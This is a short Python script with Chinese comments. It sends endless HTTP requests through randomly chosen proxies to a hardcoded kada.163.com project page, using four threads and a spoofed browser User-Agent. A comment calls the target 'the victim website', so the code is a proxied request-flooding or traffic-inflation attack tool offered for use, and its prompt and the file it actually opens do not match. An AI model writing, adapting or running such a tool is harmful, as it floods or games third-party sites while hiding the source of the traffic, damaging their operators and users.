import urllib.request,random,re
import threading

#请将代理IP地址放入根目录下111.txt

def syn_syn(sock):
    print('请将代理IP地址放入根目录下111.txt')
    url=sock#这里填写受害者网站
    f=open('1.txt','r')
    iip=f.read()
    print('文本中的代理为:\n'+str(iip))
    p=r'\d+\.\d+\.\d+\..+'
    ip=re.findall(p,iip)
    a=len(ip)
    a-=1
    while 1:
        b=random.randint(0,a)
        proxy=urllib.request.ProxyHandler({'http':ip[b]})
        opener=urllib.request.build_opener(proxy)
        #urllib.request.install_opener(opener)
        req=urllib.request.Request(url)
        req.add_header('User-Agent','User-Agent:Mozilla/5.0(Macintosh;U;IntelMacOSX10_6_8;en-us)AppleWebKit/534.50(KHTML,likeGecko)Version/5.1Safari/534.50')
        try:
            print('正在使用%s访问'%ip[b])
            response=opener.open(req)
        except:
            print('访问出错')
        else:
            print('访问成功')
         # if input('是否继续Y/N')=='N':
            #break
        #bug为只能使用一个IP作为代理 后期会修复

kd='https://kada.163.com/project/880013-926649.htm'
th_syn=threading.Thread(target=syn_syn,args=(kd,))
th_syn.start()

th_syn1=threading.Thread(target=syn_syn,args=(kd,))
th_syn1.start()

th_syn2=threading.Thread(target=syn_syn,args=(kd,))
th_syn2.start()

th_syn3=threading.Thread(target=syn_syn,args=(kd,))
th_syn3.start()







